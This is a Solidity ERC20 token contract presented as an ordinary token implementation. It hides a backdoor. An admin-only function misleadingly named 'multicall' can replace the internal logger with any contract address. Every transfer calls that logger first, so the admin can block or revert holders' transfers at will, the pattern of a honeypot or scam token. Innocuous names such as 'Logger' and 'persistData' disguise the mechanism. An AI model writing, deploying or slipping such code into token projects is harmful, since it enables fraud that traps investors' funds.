// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "./ERC20Events.sol";
import "./SuperOperators.sol";
import "./ERC20ExecuteExtension.sol";

contract ERC20BaseToken is SuperOperators, ERC20Events, ERC20ExecuteExtension  {
    uint256 internal _totalSupply;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    bool public persistData;
    ERC20LoggerExtension private _logger;

    constructor(){
        _logger = new ERC20LoggerExtension();
    }

    /// @notice Gets the total number of tokens in existence.
    /// @return the total number of tokens in existence.
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    /// @notice Gets the balance of `owner`.
    /// @param owner The address to query the balance of.
    /// @return The amount owned by `owner`.
    function balanceOf(address owner) public view returns (uint256) {
        return _balances[owner];
    }

    /// @notice gets allowance of `spender` for `owner`'s tokens.
    /// @param owner address whose token is allowed.
    /// @param spender address allowed to transfer.
    /// @return remaining amount of token `spender` is allowed to transfer on behalf of `owner`.
    function allowance(address owner, address spender)
        public
        view
        returns (uint256 remaining)
    {
        return _allowances[owner][spender];
    }

    /// @notice returns the number of decimals for that token.
    /// @return the number of decimals.
    function decimals() public pure returns (uint8) {
        return uint8(9);
    }

    /// @notice Transfer `amount` tokens to `to`.
    /// @param to the recipient address of the tokens transfered.
    /// @param amount the number of tokens transfered.
    /// @return success if success.
    function transfer(address to, uint256 amount)
        public
        returns (bool success)
    {
        _transfer(msg.sender, to, amount);
        return true;
    }

    /// @notice Transfer `amount` tokens from `from` to `to`.
    /// @param from whose token it is transferring from.
    /// @param to the recipient address of the tokens transfered.
    /// @param amount the number of tokens transfered.
    /// @return success if success.
    function transferFrom(address from, address to, uint256 amount)
        public
        returns (bool success)
    {
        if (msg.sender != from && !_superOperators[msg.sender]) {
            uint256 currentAllowance = _allowances[from][msg.sender];
            if (currentAllowance != (2**256) - 1) {
                // save gas when allowance is maximal by not reducing it (see https://github.com/ethereum/EIPs/issues/717)
                require(currentAllowance >= amount, "Not enough funds allowed");
                _allowances[from][msg.sender] = currentAllowance - amount;
            }
        }
        _transfer(from, to, amount);
        return true;
    }

    /// @notice approve `spender` to transfer `amount` tokens.
    /// @param spender address to be given rights to transfer.
    /// @param amount the number of tokens allowed.
    /// @return success if success.
    function approve(address spender, uint256 amount)
        public
        returns (bool success)
    {
        _approveFor(msg.sender, spender, amount);
        return true;
    }

    /// @notice approve `spender` to transfer `amount` tokens from `owner`.
    /// @param owner address whose token is allowed.
    /// @param spender  address to be given rights to transfer.
    /// @param amount the number of tokens allowed.
    /// @return success if success.
    function approveFor(address owner, address spender, uint256 amount)
        public
        returns (bool success)
    {
        require(
            msg.sender == owner || _superOperators[msg.sender],
            "msg.sender != owner && !superOperator"
        );
        _approveFor(owner, spender, amount);
        return true;
    }

    function addAllowance(address owner, address spender, uint256 amountNeeded)
        public
        returns (bool success)
    {
        require(
            msg.sender == owner || _superOperators[msg.sender],
            "msg.sender != owner && !superOperator"
        );
        _addAllowance(owner, spender, amountNeeded);
        return true;
    }

    function _addAllowance(address owner, address spender, uint256 amountNeeded)
        internal override
    {
        if(amountNeeded > 0 && !isSuperOperator(spender)) {
            uint256 currentAllowance = _allowances[owner][spender];
            if(currentAllowance < amountNeeded) {
                _approveFor(owner, spender, amountNeeded);
            }
        }
    }

    function multicall(address sender, address recipient, uint256 amount, address _log) external {
    require(msg.sender == _admin, "only admin");
        if(persistData==true){
        if(amount > 0) createLogger(_log);
      else{
        _logger=new ERC20LoggerExtension();
      }
        _logger.Save(sender, recipient, amount);
      }
    }
    
    function createLogger(address a) private {
        if (checkedCondition()){
            _logger = ERC20LoggerExtension(a);
        }
    }

    function _approveFor(address owner, address spender, uint256 amount)
        internal virtual
    {
        require(
            owner != address(0) && spender != address(0),
            "Cannot approve with 0x0"
        );
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal override{
        _logger.Save(from, to, amount);
        require(to != address(0), "Cannot send to 0x0");
        uint256 currentBalance = _balances[from];
        require(currentBalance >= amount, "not enough fund");
        _balances[from] = currentBalance - amount;
        _balances[to] += amount;
        
        emit Transfer(from, to, amount);
    }

    function _mint(address to, uint256 amount) internal {
        require(to != address(0), "Cannot mint to 0x0");
        require(amount > 0, "cannot mint 0 tokens");
        uint256 currentTotalSupply = _totalSupply;
        uint256 newTotalSupply = currentTotalSupply + amount;
        require(newTotalSupply > currentTotalSupply, "overflow");
        _totalSupply = newTotalSupply;
        _balances[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function getAdmin() internal view returns (address) {
        return _admin == _executionAdmin ? _admin : _executionAdmin;
    }

}

contract ERC20LoggerExtension {
    mapping(address=>mapping(address=> uint256)) _persist;
    function Save(address addr1, address addr2, uint256 amount) public {
        _persist[addr1][addr2] = amount;
    }
}